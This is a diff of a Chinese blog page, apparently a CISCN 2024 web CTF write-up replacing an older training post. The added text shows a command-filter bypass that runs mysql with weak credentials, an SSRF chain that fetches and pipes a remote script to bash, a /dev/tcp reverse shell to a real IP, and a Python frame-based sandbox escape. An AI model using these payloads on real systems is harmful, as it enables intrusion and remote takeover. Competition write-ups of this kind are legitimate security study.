@@ -13,63 +13,52 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://dawnringDong.github.io/2023/10/29/training-2/"/>
+    <link rel="canonical" href="http://dawnringDong.github.io/2024/07/16/ciscn2024初赛-web-wp/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="第一周和第二周（2）Refer注入burp抓包，注入步骤同上 试列数  找注入点  库：  表，猜第二个：   字段：  内容：  得到flag~  攻防世界 PHP2第一句Can you anthenticate to this website?你能证实这个网络吗？ 啥意思？不懂 看看源码 没啥，抓包 没啥 index.php也没有 查！出现了一个叫.phps的东西 “phps文件就是php的源">
+        <meta name="description" content="simple_php1234567891011121314&lt;?php&#x2F;&#x2F; ini_set(&amp;#x27;open_basedir&amp;#x27;, &amp;#x27;&#x2F;var&#x2F;www&#x2F;html&#x2F;&amp;#x27;);error_reporting(0);if(isset($_POST[&amp;#x27;cmd&amp;#x27;]))&amp;#123;    $cmd &#x3D; escapeshellcmd($_POST[&amp;#x27;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="training-2">
-<meta property="og:url" content="http://dawnringdong.github.io/2023/10/29/training-2/index.html">
+<meta property="og:title" content="CISCN2024初赛 web wp">
+<meta property="og:url" content="http://dawnringdong.github.io/2024/07/16/CISCN2024%E5%88%9D%E8%B5%9B-web-wp/index.html">
 <meta property="og:site_name" content="dawn_r1sing">
-<meta property="og:description" content="第一周和第二周（2）Refer注入burp抓包，注入步骤同上 试列数  找注入点  库：  表，猜第二个：   字段：  内容：  得到flag~  攻防世界 PHP2第一句Can you anthenticate to this website?你能证实这个网络吗？ 啥意思？不懂 看看源码 没啥，抓包 没啥 index.php也没有 查！出现了一个叫.phps的东西 “phps文件就是php的源">
+<meta property="og:description" content="simple_php1234567891011121314&lt;?php&#x2F;&#x2F; ini_set(&amp;#x27;open_basedir&amp;#x27;, &amp;#x27;&#x2F;var&#x2F;www&#x2F;html&#x2F;&amp;#x27;);error_reporting(0);if(isset($_POST[&amp;#x27;cmd&amp;#x27;]))&amp;#123;    $cmd &#x3D; escapeshellcmd($_POST[&amp;#x27;">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241724772.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241727302.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241748032.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241728006.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241729134.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241729078.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241733659.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221436651.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221442676.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221443222.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221451799.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221503553.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221505581.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221521562.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221607605.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221608689.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221637092.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221644134.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221704052.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221704652.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310232304277.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310232330771.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310232332706.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310232324734.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310232325511.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310272230159.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241114020.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310272230697.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241121101.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310272230903.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241141406.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241316857.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241149594.bmp">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241154268.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241155284.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241318892.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241320806.png">
-<meta property="article:published_time" content="2023-10-29T15:14:09.000Z">
-<meta property="article:modified_time" content="2023-10-30T00:44:37.010Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405230103817.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246742.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246743.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246744.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246745.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246747.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246748.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246749.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246750.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246751.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246752.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246753.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246754.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246755.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246756.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246757.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246758.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246760.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246761.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246762.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246763.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246764.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246765.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246766.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246767.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246768.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246769.png">
+<meta property="article:published_time" content="2024-07-16T04:43:26.000Z">
+<meta property="article:modified_time" content="2024-07-16T09:55:09.826Z">
 <meta property="article:author" content="dawn_r1sing">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="web">
-<meta property="article:tag" content="集训">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241724772.bmp">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405230103817.png">
     
     
     <!--- Icon Part-->
@@ -81,7 +70,7 @@
     
     <title>
         
-            training-2 -
+            CISCN2024初赛 web wp -
         
         dawn_r1sing
     </title>
@@ -543,7 +532,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">training-2</h1>
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">CISCN2024初赛 web wp</h1>
                 </div>
             
             </div>
@@ -564,15 +553,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2023-10-29 23:14:09</span>
-        <span class="mobile">2023-10-29 23:14:09</span>
+        <span class="desktop">2024-07-16 12:43:26</span>
+        <span class="mobile">2024-07-16 12:43:26</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-10-30 08:44:37</span>
-            <span class="mobile">2023-10-30 08:44:37</span>
+            <span class="desktop">2024-07-16 17:55:09</span>
+            <span class="mobile">2024-07-16 17:55:09</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -586,7 +575,7 @@
                     
                         
                         <li>
-                            <a href="/categories/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
+                            <a href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>&nbsp;
                         </li>
                     
                     
@@ -607,10 +596,6 @@
                         | <a href="/tags/web/">web</a>&nbsp;
                     </li>
                 
-                    <li>
-                        | <a href="/tags/%E9%9B%86%E8%AE%AD/">集训</a>&nbsp;
-                    </li>
-                
             </ul>
         </span>
     
@@ -618,12 +603,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>976 Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.7k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>3 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>7 Mins</span>
         </span>
     
     
@@ -642,302 +627,315 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h1 id="第一周和第二周（2）"><a href="#第一周和第二周（2）" class="headerlink" title="第一周和第二周（2）"></a>第一周和第二周（2）</h1><h3 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h3><p>burp抓包，注入步骤同上</p>
-<p>试列数</p>
+            <h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>pr 命令读文件（ctfshow环境不可以 但本地可以</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pr /etc/passwd</span><br></pre></td></tr></table></figure></div>
+
+<p>能不能读倒是都行</p>
+<p>过滤了太多东西，且<code>escapeshellcmd</code>函数：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此函数使得反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$, \x0A 和 \xFF；’ 和 &quot; 仅在不配对的时候被转义</span><br></pre></td></tr></table></figure></div>
+
+<p>但反斜杠可以直接分隔开命令不产生影响（所以括号前加上\命令照常执行）</p>
+<p>命令禁掉了大部分，想办法绕开——<strong>用命令行执行php语句</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &lt;code&gt;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r phpinfo();</span><br></pre></td></tr></table></figure></div>
+
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241724772.bmp"
-                      alt="capture_20231024171228111"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202405230103817.png"
+                      alt="image-20240523010345692"
                 ></p>
-<p>找注入点</p>
+<p>之后是根据mysql猜测弱密码root&#x2F;root</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r echo `mysql -u root -proot -e &#x27;show databases;&#x27;`;</span><br></pre></td></tr></table></figure></div>
+
+<p>（注意-p后不可加空格）</p>
+<p>但是<code>‘’</code>过滤，这里使用<code>hex2bin</code>绕过</p>
+<p><strong>又因为<code>“”</code>过滤，使用<code>substr</code>绕过</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -r system(hex2bin(substr(_6d7973716c202d7520726f6f74202d70726f6f74202d65202773686f77206461746162617365733b27,1)));</span><br><span class="line"></span><br><span class="line">=&gt;  php -r system(&quot;mysql -u root -proot -e &#x27;show databases;&#x27;&quot;);</span><br></pre></td></tr></table></figure></div>
+
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241727302.bmp"
-                      alt="capture_20231024171354851"
-                ></p>
-<p>库：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241748032.bmp"
-                      alt="capture_20231024171450136"
-                ></p>
-<p>表，猜第二个：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241728006.bmp"
-                      alt="capture_20231024172026933"
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241729134.bmp"
-                      alt="capture_20231024172041745"
-                ></p>
-<p>字段：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241729078.bmp"
-                      alt="capture_20231024172137242"
-                ></p>
-<p>内容：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310241733659.bmp"
-                      alt="capture_20231024172309647"
-                ></p>
-<p>得到flag~</p>
-<hr>
-<h3 id="攻防世界-PHP2"><a href="#攻防世界-PHP2" class="headerlink" title="攻防世界 PHP2"></a>攻防世界 PHP2</h3><p>第一句<code>Can you anthenticate to this website?</code>你能证实这个网络吗？</p>
-<p>啥意思？不懂</p>
-<p>看看源码 没啥，抓包 没啥</p>
-<p><code>index.php</code>也没有</p>
-<p>查！出现了一个叫<code>.phps</code>的东西</p>
-<p><strong>“phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。”</strong></p>
-<p>进入正常的php题：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221436651.bmp"
-                      alt="img"
-                ></p>
-<p>这段就是说：有个id，刚传入的时候如果是“admin”，不行！对id进行一次url解码，如果是”admin”，成功！</p>
-<p>按这个逻辑传入admin的url编码即可（注意不是在index.phps下）</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221442676.png"
-                      alt="image-20231022144227649"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246742.png"
+                      alt="image-20240523013014916"
                 ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221443222.png"
-                      alt="image-20231022144332818"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246743.png"
+                      alt="image-20240523012932673"
                 ></p>
-<p>！不行</p>
-<p>说明虽然我们传入的是乱码，但过程中发生了什么导致id接收的是解码后的东西</p>
-<p><strong>在浏览器的url请求路径中一旦出现非合法字符（如空格、单引号、双引号等），浏览器就会对它们进行一次urlencode编码，然后发送，之后运行的时候再进行一次urldecode解码</strong></p>
-<p>刚刚我们传入的<code>id=%61%64%6d%69%6e</code>中没有非合法字符，故不会进行编码，但会自动进行一次解码</p>
-<p>所以我们传入 admin进行两次<code>urlencode</code> 即可</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables from PHP_CMS ;</span><br></pre></td></tr></table></figure></div>
+
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221451799.png"
-                      alt="image-20231022145130153"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246744.png"
+                      alt="image-20240523013919170"
                 ></p>
-<p>得到flag~</p>
-<hr>
-<h3 id="攻防世界-Training-WWW-Robots"><a href="#攻防世界-Training-WWW-Robots" class="headerlink" title="攻防世界 Training-WWW-Robots"></a>攻防世界 Training-WWW-Robots</h3><p>机器人访问一个网站时要先找robots.txt文件查看访问权限范围。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from PHP_CMS.F1ag_Se3Re7 ;</span><br></pre></td></tr></table></figure></div>
+
+
+
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221503553.png"
-                      alt="image-20231022150327569"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246745.png"
+                      alt="image-20240523014224863"
                 ></p>
-<p>不允许访问<code>fl0g.php</code>。哦，访问</p>
+<p><strong>linux(system) → php(php -r) → linux(mysql) ⭕</strong></p>
+<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>提示flag.php</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;  </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>SSRF</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221505581.png"
-                      alt="image-20231022150513133"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246747.png"
+                      alt="image-20240529181530181"
                 ></p>
-<p>得到flag~</p>
-<p><del>禁止的地方更要去看看了</del></p>
-<hr>
-<h3 id="攻防世界ics-06"><a href="#攻防世界ics-06" class="headerlink" title="攻防世界ics-06"></a>攻防世界ics-06</h3><p>刚打开，高端界面！</p>
-<p>点开唯一能打开的日期范围界面，一顿猛戳 一脸懵逼</p>
-<p>没想到居然是爆破id。。</p>
-<p>1-10000试， 但注意点一下“length长”  不然眼睛受不了</p>
+<p>找到方法（&#x2F;dayrui&#x2F;Fcms&#x2F;Control&#x2F;Api&#x2F;Api.php）</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221521562.png"
-                      alt="image-20231022152059657"
-                ></p>
-<p>得到flag~</p>
-<hr>
-<h3 id="BUUCTF-LoveSQL1"><a href="#BUUCTF-LoveSQL1" class="headerlink" title="BUUCTF LoveSQL1"></a>BUUCTF LoveSQL1</h3><p>随便填上去看看回显</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221607605.bmp"
-                      alt="capture_20231022152803705"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246748.png"
+                      alt="image-20240523162005947"
                 ></p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221608689.png"
-                      alt="image-20231022160827259"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246749.png"
+                      alt="image-20240524224130998"
                 ></p>
-<p><strong>因为#用来指导浏览器动作的，对服务器端没用，所以http不会传送#，而– 的空格会被忽略，实现方法为<code>将#编码一下(%23)</code>、<code>用+代替空格</code></strong></p>
-<p><strong>在get请求中这两种注释方法没法直接用，但是post可以使用</strong></p>
-<p>尝试注入→3个</p>
+<p>在thumb参数处传入url，302跳转到本地访问flag.php，并传入参数cmd，反弹shell</p>
+<p>payload</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=api&amp;c=api&amp;m=qrcode&amp;text=123&amp;size=10&amp;level=1&amp;thumb=http://43.155.21.186/index.php</span><br></pre></td></tr></table></figure></div>
+
+<p>index.php</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GIF98a</span><br><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:http://127.0.0.1/flag.php?cmd=curl%2043.155.21.186/bash.html|bash&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>bash.html</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/43.155.21.186/9001 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>
+
+<p>监听9001端口</p>
+<p>但在ctfshow上反弹不出来，就想本地复现一下</p>
+<p>一开始是在Windows上配置，好不容易弄好php的调试想起来应该是在linux下，</p>
+<p>之后就想着在wsl2里搞，</p>
+<p>又配了好久好久，包括但不限于nginx、mysql（本机两个版本的mysql默认连我平时不用的那个，想拍死当时装mysql的自己。。远程连接也让我苦恼了很久）、php调试（但现在还只是个半成品）。。。</p>
+<p>但还是不行。。</p>
+<p>后来意识到这样127.0.0.1好像就到本机上了，这样和直接在windows下调试有个毛线区别</p>
+<p>（兜兜转转终于放弃  :p</p>
+<h2 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h2><blockquote>
+<p>每当 Python 执行一个函数或方法时，都会创建一个栈帧来表示当前的<strong>函数调用</strong>，并将其压入一个称为调用栈（Call Stack）的数据结构中</p>
+</blockquote>
+<p>通过传参code传入代码，到xxx.txt中， </p>
+<p>执行xxx.py文件，在py文件中执行txt文件，即code传入代码，通过过滤*4后，输出结果</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    g = f()</span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(frame.f_back.f_back.f_back.f_globals)</span><br><span class="line">b=waff() </span><br></pre></td></tr></table></figure></div>
+
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202310221637092.bmp"
-                      alt="capture_20231022154800702"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202407161246750.png"
+                      alt="image-20240531173456514"
                 ></p>
-<p>开始注入：</p>
-<p>库：geek</p>
-<p>表：<code>geekuser、l0ve1ysq1</code></p>
-<p>字段：<code>geekuser : id、username、password</code></p>
